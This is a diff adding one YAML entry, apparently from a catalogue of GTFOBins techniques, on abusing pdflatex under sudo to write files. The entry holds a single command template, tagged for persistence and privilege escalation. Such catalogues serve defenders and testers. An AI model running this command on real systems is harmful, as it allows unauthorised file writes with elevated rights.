@@ -1,0 +1,25 @@
+id: gtfobins/pdflatex/file-write/sudo
+type: binary
+platform: linux
+name: pdflatex
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+  comment: The file can only be written in the current directory, and the `.tex` extension is mandatory.
+references:
+- https://gtfobins.github.io/gtfobins/pdflatex/
+tags:
+- linux
+- unix
+- gtfobins
